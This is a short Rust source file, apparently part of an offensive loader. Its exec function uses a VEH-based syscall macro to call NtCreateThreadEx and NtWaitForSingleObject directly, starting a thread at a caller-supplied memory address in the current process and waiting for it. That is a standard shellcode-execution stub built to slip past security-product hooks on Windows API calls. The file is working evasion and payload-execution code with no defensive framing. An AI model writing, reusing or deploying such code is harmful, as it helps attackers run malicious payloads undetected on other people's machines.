use rust_veh_syscalls::syscall;
use std::ffi::c_void;
use std::ptr;
use windows::Win32::Foundation::HANDLE;

#[allow(non_snake_case)]
type NtCreateThreadEx = unsafe extern "system" fn(
    ThreadHandle: *mut HANDLE,
    DesiredAccess: u32,
    ObjectAttributes: *mut c_void,
    ProcessHandle: HANDLE,
    StartAddress: *mut c_void,
    Parameter: *mut c_void,
    CreateFlags: u32,
    ZeroBits: usize,
    StackSize: usize,
    MaximumStackSize: usize,
    AttributeList: *mut c_void,
) -> i32;

#[allow(non_snake_case)]
type NtWaitForSingleObject = unsafe extern "system" fn(
    Handle: HANDLE,
    Alertable: u8,
    Timeout: *mut i64,
) -> i32;

pub unsafe fn exec(p: usize) -> Result<(), String> {
    const THREAD_ALL_ACCESS: u32 = 0x001F_0FFF;

    let mut thread_handle = HANDLE(0);

    let status = syscall!(
        "NtCreateThreadEx",
        NtCreateThreadEx,
        &mut thread_handle as *mut HANDLE,
        THREAD_ALL_ACCESS,
        ptr::null_mut(),
        HANDLE(-1isize as isize),
        p as *mut c_void,
        ptr::null_mut(),
        0,
        0,
        0,
        0,
        ptr::null_mut()
    );

    if status != 0 {
        return Err(format!("NtCreateThreadEx failed with status: 0x{:x}", status));
    }

    let wait_status = syscall!(
        "NtWaitForSingleObject",
        NtWaitForSingleObject,
        thread_handle,
        0u8,
        ptr::null_mut()
    );

    if wait_status == 0 {
        Ok(())
    } else {
        Err(format!("NtWaitForSingleObject failed with status: 0x{:x}", wait_status))
    }
}